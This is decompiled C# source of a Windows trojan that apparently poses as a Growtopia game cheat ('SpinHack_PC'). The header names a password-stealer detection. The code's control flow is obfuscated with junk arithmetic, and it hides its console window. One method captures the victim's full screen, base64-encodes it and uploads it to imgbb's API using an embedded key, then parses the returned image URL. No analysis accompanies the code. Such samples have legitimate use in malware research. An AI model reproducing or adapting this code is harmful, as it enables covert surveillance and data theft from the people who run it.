// Decompiled with JetBrains decompiler
// Type: 40326F226
// Assembly: SpinHack_PC, Version=0.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: 65E7A0C4-9AD9-4435-B85F-DA409F1EDFB9
// Assembly location: C:\Users\Administrateur\Downloads\ransomware_new\HEUR-Trojan-PSW.MSIL.Growtopia.gen-6e6f85f9f7933c4446076b2de915fc2fbc76ca58137fe993addedeabb4392347.exe

using System;
using System.Collections.Specialized;
using System.Drawing;
using System.IO;
using System.Net;
using System.Runtime.InteropServices;
using System.Text;
using System.Text.RegularExpressions;
using System.Windows.Forms;

internal class \u00340326F226
{
  private static FileSystemWatcher \u0031E9CAE65A;
  private static WebClient \u00356D7E3101;
  private static string \u003413F5FB30;
  private static string \u00353151C4C7;
  private static string \u0037AC5E6F6;
  private static string \u00321C16BC1D;
  private static string \u003431079213;
  private static string \u0034ED168CF5;
  private static string ADB81777;
  private static string \u003473C9B7F2;
  private static string \u003191970E05;
  private static string \u003444EA045A;
  private static string \u003310E6010E;
  private static string \u0034F9908E63;
  private static string \u0030C214881;
  private static string \u00363086B5A;
  private static string \u0033FA02E4A8;
  private static bool \u00340D3EFC32;

  [DllImport("kernel32.dll", EntryPoint = "GetConsoleWindow")]
  private static extern IntPtr \u003569F0C97C();

  [DllImport("user32.dll", EntryPoint = "SetProcessDPIAware")]
  private static extern bool \u0032BD073056();

  [DllImport("user32.dll", EntryPoint = "ShowWindow")]
  private static extern bool \u00354F1FE4A3(IntPtr _param0, int _param1);

  private static void \u0031950E474F(string A1492D27, string _param1 = "Debug") => new \u0037BA67F86().\u00313FD286A(new object[2]
  {
    (object) A1492D27,
    (object) _param1
  }, 275407);

  [STAThread]
  private static void \u0034397A2DB5() => new \u0037BA67F86().\u00313FD286A((object[]) null, 417539);

  private static void \u003334C4C52B(object _param0, FileSystemEventArgs _param1) => new \u0037BA67F86().\u00313FD286A(new object[2]
  {
    _param0,
    (object) _param1
  }, 266108);

  private static void \u0032C2F68F3D() => new \u0037BA67F86().\u00313FD286A((object[]) null, 386673);

  private static unsafe string AB4B08F7()
  {
    uint num1 = 1472280910;
    string str1;
    try
    {
      do
        ;
      while (num1 <= 1996781969U && 971913083U == num1);
      do
      {
        \u00340326F226.\u0031950E474F("Taking and uploading screenshot..", "Screenshot");
      }
      while (num1 > 1735594762U);
      Screen screen1 = \u00322007DD3.\u0037DE45E03();
      uint num2 = 1266556247U / num1;
      Rectangle rectangle1 = \u0035C1107CB.\u00362392A0E((object) screen1);
      uint num3 = 85414091U - num2;
      int num4 = \u00306CB046C.\u0035270119E(&rectangle1);
      Screen screen2 = \u00322007DD3.\u0037DE45E03();
      uint num5 = 765662992U * num3;
      Rectangle rectangle2 = \u0035C1107CB.\u00362392A0E((object) screen2);
      uint num6 = num5 * 286611110U;
      Rectangle rectangle3 = rectangle2;
      uint num7 = num6 * 1319639088U;
      ref Rectangle local = ref rectangle3;
      uint num8 = 771386702U * num7;
      int num9 = \u0030BE00A0D.\u00360ED6E02((Rectangle*) ref local);
      uint num10 = num8 * 1910588931U;
      object obj1 = \u0035B527DD5.\u0032D7B25EC(num4, num9);
      uint num11 = 1826894646U >> (int) num10;
      Bitmap bitmap1 = (Bitmap) obj1;
      Graphics graphics1 = \u00363C80A82.\u00372040264((Image) bitmap1);
      try
      {
        do
        {
          do
          {
            num11 = 1339905931U % num11;
          }
          while (1915626285U < num11);
          Graphics graphics2 = graphics1;
          uint num12 = num11 * 1550980577U;
          int num13 = (int) num12 ^ 1235114027;
          uint num14 = 504048642U % num12;
          int num15 = (int) num14 ^ 504048642;
          int num16 = (int) num14 - 504048642;
          int num17 = (int) num14 ^ 504048642;
          uint num18 = 107493255U - num14;
          Rectangle rectangle4 = \u0035C1107CB.\u00362392A0E((object) \u00322007DD3.\u0037DE45E03());
          uint num19 = 582560048U ^ num18;
          rectangle3 = rectangle4;
          uint num20 = 488787783U << (int) num19;
          Size size = \u0036BA953FC.\u0033DBE4438(&rectangle3);
          \u003026A2FB5.\u0037BE00228((object) graphics2, num13, num15, num16, num17, size);
          num11 = 1055396045U >> (int) num20;
        }
        while ((int) num11 + 701004047 == 0);
      }
      finally
      {
        bool flag = graphics1 == null;
        uint num21 = 619463274;
        do
        {
          int num22 = flag ? 1 : 0;
          num21 = 2082407926U >> (int) num21;
          if (num22 == 0)
          {
            Graphics graphics3 = graphics1;
            num21 -= 808262403U;
            graphics3.Dispose();
            if (num21 > 523776830U)
              num21 ^= 3488541567U;
          }
        }
        while (num21 == 1091517766U);
      }
      NameValueCollection nameValueCollection1;
      uint num23;
      do
      {
        uint num24 = 1794644680;
        ImageConverter imageConverter1 = (ImageConverter) \u00324AE7AA1.\u00341720BF2();
        uint num25 = num24 | 168305880U;
        object obj2 = \u00304143D1F.\u00368E615C9();
        uint num26 = num25 >> 17;
        nameValueCollection1 = (NameValueCollection) obj2;
        uint num27 = num26 | 1617708275U;
        NameValueCollection nameValueCollection2 = nameValueCollection1;
        ImageConverter imageConverter2 = imageConverter1;
        Bitmap bitmap2 = bitmap1;
        uint num28 = num27 / 1881884179U;
        // ISSUE: type reference
        System.Type destinationType = \u00361875A8B.\u00338D650E1(__typeref (byte[]));
        uint num29 = num28 / 315118583U;
        object obj3 = imageConverter2.ConvertTo((object) bitmap2, destinationType);
        uint num30 = 458818408U | num29;
        string str2 = \u0030822186C.\u0030AE0557C((byte[]) obj3);
        uint num31 = 1577717614U & num30;
        \u0030E1E3CA3.\u00374F12760((object) nameValueCollection2, "image", str2);
        num23 = num31 & 2017932424U;
      }
      while (num23 == 828862480U);
      NameValueCollection nameValueCollection3 = nameValueCollection1;
      uint num32 = 262672228U >> (int) num23;
      WebClient webClient = \u00340326F226.\u00356D7E3101;
      uint num33 = 873821191U - (1968656580U ^ num32);
      NameValueCollection nameValueCollection4 = nameValueCollection3;
      uint num34 = 2085750883U >> (int) num33;
      byte[] numArray1 = \u0030A5630B2.\u00377E63564((object) webClient, "https://api.imgbb.com/1/upload?key=09fc1b743d83e4e0c0be5acbfc87b1eb", nameValueCollection4);
      uint num35 = num34 | 891569273U;
      Encoding encoding = \u00353C0760C.\u0036ED17878();
      byte[] numArray2 = numArray1;
      uint num36 = 1950950059U ^ num35;
      string str3 = \u0030D115394.\u00307C72EEF((object) encoding, numArray2);
      uint num37 = 897671599U | 1935302771U + num36;
      string str4 = str3.Replace("\\/", "/");
      uint num38 = num37 / 709111908U;
      Regex regex = new Regex("(https?:\\/\\/[a-zA-Z0-9]+\\.[^\\s][^\"]{1,}[a-zA-Z0-9]+\\.png)");
      string input = str4;
      uint num39 = num38 + 1131548212U;
      Match match = regex.Match(input);
      uint num40 = num39 & 1266099840U;
      GroupCollection groupCollection = \u00363173CDE.\u00328D35804((object) match);
      uint num41 = num40 ^ 278796923U;
      int num42 = (int) num41 ^ 1407982715;
      string str5 = \u00351B43B10.\u0030A62702F((object) groupCollection, num42).Value;
      uint num43 = 597049691U + num41;
      str1 = str5;
      uint num44 = num43 / 1112811771U;
    }
    catch (Exception ex)
    {
label_15:
      uint num45;
      do
      {
        uint num46;
        do
        {
          num46 = (uint) (1048470164 * 1715953769);
        }
        while ((1346780314 & (int) num46) == 0);
        str1 = "";
        uint num47 = 777533830U + num46;
        string A1492D27 = ex.ToString();
        num45 = num47 ^ 621745131U;
        \u00340326F226.\u0031950E474F(A1492D27, "Screenshot");
        do
        {
          if (1741245829U != num45)
            num45 = 1438673437U << (int) num45;
          else
            goto label_15;
        }
        while (1267600809U > num45);
      }
      while (984618445U / num45 != 0U);
    }
    uint num48 = 69671720;
    string str6;
    do
    {
      do
      {
        str6 = str1;
      }
      while ((int) num48 << 9 == 0);
      num48 ^= 903573294U;
    }
    while (num48 == 476257014U);
    return str6;
  }

  private static void \u003432A1E95E() => new \u0037BA67F86().\u00313FD286A((object[]) null, 277413);

  public static bool \u0031901DFC13() => (bool) new \u0037BA67F86().\u00313FD286A((object[]) null, 409918);

  private static string \u0035CB53C67() => (string) new \u0037BA67F86().\u00313FD286A((object[]) null, 436629);

  private static void E61FA898() => new \u0037BA67F86().\u00313FD286A((object[]) null, 422955);

  private static void \u0032972A44E2() => new \u0037BA67F86().\u00313FD286A((object[]) null, 425268);

  public static string \u003285511110() => (string) new \u0037BA67F86().\u00313FD286A((object[]) null, 267993);

  private static string \u0031350E2E15() => (string) new \u0037BA67F86().\u00313FD286A((object[]) null, 407552);

  private static string \u0035487F13E0() => (string) new \u0037BA67F86().\u00313FD286A((object[]) null, 433368);

  private static string \u00332C736EE1(string _param0) => (string) new \u0037BA67F86().\u00313FD286A(new object[1]
  {
    (object) _param0
  }, 389076);

  private static string \u0033F158D571() => (string) new \u0037BA67F86().\u00313FD286A((object[]) null, 400764);

  private static string[] \u0033F5766978(string _param0) => (string[]) new \u0037BA67F86().\u00313FD286A(new object[1]
  {
    (object) _param0
  }, 417149);

  public \u00340326F226() => new \u0037BA67F86().\u00313FD286A(new object[1]
  {
    (object) this
  }, 434696);

  static \u00340326F226() => new \u0037BA67F86().\u00313FD286A((object[]) null, 414181);
}
